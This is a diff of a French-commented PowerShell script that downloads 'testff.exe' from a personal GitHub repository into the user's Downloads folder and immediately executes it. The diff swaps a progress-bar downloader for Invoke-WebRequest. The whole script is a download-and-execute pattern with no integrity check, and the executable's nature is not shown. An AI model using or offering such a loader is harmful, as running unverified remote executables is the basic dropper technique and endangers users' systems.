@@ -1,64 +1,49 @@
 # Définir l'URL du fichier à télécharger
 $url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"
 
-# Définir le chemin local où le fichier sera enregistré
-$localPath = "$PWD\testff.exe"
+# Obtenir le nom d'utilisateur actuel
+$userProfile = [System.Environment]::GetFolderPath("UserProfile")
 
-# Fonction pour afficher la barre de chargement personnalisée
-function Show-CustomProgress {
+# Définir le chemin local dans le dossier "Téléchargements"
+$localPath = "$userProfile\Downloads\testff.exe"
+
+# Fonction pour afficher l'emplacement du fichier
+function Show-FileLocation {
     param (
-        [int]$total,
-        [int]$current
+        [string]$filePath
     )
-    $percent = ($current / $total) * 100
-    $barLength = 50
-    $bar = "*" * [math]::floor(($percent / 100) * $barLength)
-    $padding = "." * ($barLength - $bar.Length)
-    Write-Host ("[" + $bar + $padding + "] " + $percent + "% complété") -NoNewline
-    # Revenir au début de la ligne pour la mise à jour
-    [Console]::CursorLeft = 0
+    Write-Output "Le fichier a été téléchargé à l'emplacement suivant : $filePath"
 }
 
-# Télécharger le fichier avec une barre de chargement personnalisée
-$webClient = New-Object System.Net.WebClient
-$totalBytes = [System.Net.WebRequest]::Create($url).GetResponse().ContentLength
-$currentBytes = 0
+# Afficher le chemin de téléchargement
+Write-Output "Chemin de téléchargement : $localPath"
 
-# Définir un gestionnaire d'événements pour le téléchargement
-Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
-    param($sender, $e)
-    $currentBytes = $e.BytesReceived
-    Show-CustomProgress -total $totalBytes -current $currentBytes
+# Créer le répertoire "Téléchargements" s'il n'existe pas
+if (-Not (Test-Path -Path "$userProfile\Downloads")) {
+    New-Item -ItemType Directory -Path "$userProfile\Downloads"
+    Write-Output "Le répertoire 'Téléchargements' a été créé."
 }
 
-# Télécharger le fichier
-$webClient.DownloadFileAsync($url, $localPath)
-
-# Attendre la fin du téléchargement
-while ($webClient.IsBusy) {
-    Start-Sleep -Milliseconds 100
+# Télécharger le fichier avec Invoke-WebRequest
+try {
+    Invoke-WebRequest -Uri $url -OutFile $localPath
+    Write-Output "Le fichier a été téléchargé avec succès."
+    Show-FileLocation -filePath $localPath
+} catch {
+    Write-Output "Erreur lors du téléchargement du fichier : $_"
 }
-
-# Afficher un retour à la ligne final
-Write-Host ""
 
 # Vérifier si le fichier a été téléchargé avec succès
 if (Test-Path $localPath) {
-    Write-Output "Le fichier a été téléchargé avec succès."
+    Write-Output "Le fichier existe à l'emplacement : $localPath"
 
     # Lancer le fichier exécutable
-    $process = Start-Process -FilePath $localPath -PassThru
-
-    # Afficher une barre de chargement pendant l'exécution
-    while (!$process.HasExited) {
-        for ($i = 0; $i -le 100; $i++) {
-            Write-Host ("Lancement en cours [" + "*" * ($i / 2) + "." * (50 - ($i / 2)) + "] " + $i + "% complété") -NoNewline
-            Start-Sleep -Milliseconds 100
-            [Console]::CursorLeft = 0
-        }
+    try {
+        Start-Process -FilePath $localPath
+        Write-Output "Le fichier a été exécuté avec succès."
+    } catch {
+        Write-Output "Erreur lors de l'exécution du fichier : $_"
     }
-    Write-Host ""
-    Write-Output "Le fichier a été exécuté avec succès."
 } else {
-    Write-Output "Erreur lors du téléchargement du fichier."
+    Write-Output "Le fichier n'a pas été téléchargé correctement."
 }
